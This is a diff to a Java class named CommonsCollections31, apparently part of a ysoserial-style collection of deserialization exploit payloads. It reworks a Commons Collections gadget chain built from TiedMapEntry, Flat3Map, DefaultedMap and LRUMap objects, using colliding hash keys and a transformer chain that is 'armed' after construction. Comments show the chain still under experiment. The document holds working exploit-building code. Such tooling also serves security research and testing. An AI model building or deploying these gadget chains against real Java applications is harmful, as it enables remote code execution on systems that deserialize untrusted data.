@@ -64,20 +64,28 @@ public class CommonsCollections31 extends PayloadRunner
 
         Hashtable hashtable1 = new Hashtable();
         hashtable1.put("yy", 1);
-        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(hashtable1, hashtable1);
+        TiedMapEntry tiedMapEntry1 = new TiedMapEntry(hashtable1, chain);
         Flat3Map flat3Map1 = new Flat3Map();
-        flat3Map1.put(tiedMapEntry1, tiedMapEntry1);
+        flat3Map1.put(tiedMapEntry1, 2);
 
         Hashtable hashtable2 = new Hashtable();
         hashtable2.put("zZ", 1); // it should have a level less, so no Flat3Map or not TiedMap, in this way it could be
         // possible to reach Hashtable in the TiedMapEntry.equals. Or maybe we should put DefaultedMap at the bottom
         // instead of Hashtable (let's try this one)
-        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(hashtable2, hashtable2);
-        Flat3Map flat3Map2 = new Flat3Map();
-        flat3Map2.put(tiedMapEntry2, tiedMapEntry2);
-        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap(flat3Map2, (Transformer<Integer,String>)chain);
+        //TiedMapEntry tiedMapEntry2 = new TiedMapEntry(hashtable2, chain);
+        //Flat3Map flat3Map2 = new Flat3Map();
+        //flat3Map2.put(tiedMapEntry2, 2);
+        //DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap(flat3Map2, (Transformer<Integer,String>)chain);
+        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap(hashtable2, (Transformer<Integer,String>)chain);
 
-        lruMap.put(defaultedMap, "a");
+        TiedMapEntry tiedMapEntry2 = new TiedMapEntry(defaultedMap, chain);
+        Flat3Map flat3Map2 = new Flat3Map();
+        flat3Map2.put(tiedMapEntry2, 2);
+
+        // TODO: provare ad aggiungere uno step (metodo) alla volta partendo da uguale a CC10
+        //lruMap.put(defaultedMap, "a");
+        //lruMap.put(flat3Map1, "b");
+        lruMap.put(flat3Map2, "a");
         lruMap.put(flat3Map1, "b");
 
         // swap in values to arm
